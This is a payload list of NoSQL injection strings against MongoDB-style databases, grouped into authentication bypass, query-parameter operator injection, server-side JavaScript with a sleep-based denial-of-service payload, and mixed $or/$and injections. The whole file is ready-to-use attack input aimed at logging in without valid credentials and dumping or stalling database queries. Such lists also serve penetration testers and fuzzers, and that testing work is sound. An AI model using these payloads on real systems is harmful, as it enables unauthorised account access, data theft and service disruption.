# NoSQL Injection Payloads
# Targets: MongoDB-style operators, auth bypass, server-side JavaScript, and query-key injection

# === Authentication Bypass ===
{"username":{"$ne":null},"password":{"$ne":null}}
{"password":{"$gt":""}}
{"user":{"$ne":""}}
{"email":{"$eq":false}}
{"active":{"$ne":true}}
{"login":{"$lte":""}}
{"account":{"$gte":null}}

# === Query Parameter Operator Injection ===
username[$ne]=admin
password[$gt]=
user[$exists]=true
role[$in][]=admin
filter[$or][0][admin]=true
q[$regex]=.*
profile[$where]=this.isAdmin

# === Server-Side JavaScript / DoS ===
{"$where":"sleep(5000)"}
{"$where":"this.password.length>0"}
{"$where":"return true"}
{"q":{"$function":{"body":"function(){return true}"}}}
{"q":{"$accumulator":{"init":"function(){return 1}"}}}
{"mapReduce":"users"}
{"mapreduce":"orders"}

# === Mixed Operator Injection ===
{"$or":[{"user":"admin"},{"password":{"$ne":null}}]}
{"$and":[{"tenant":"default"},{"role":{"$ne":null}}]}
{"query":{"username":{"$regex":".*"},"password":{"$ne":null}}}
{"selector":{"$where":"function(){return this.admin == true}"}}
{"criteria":{"$function":{"body":"x"}}}
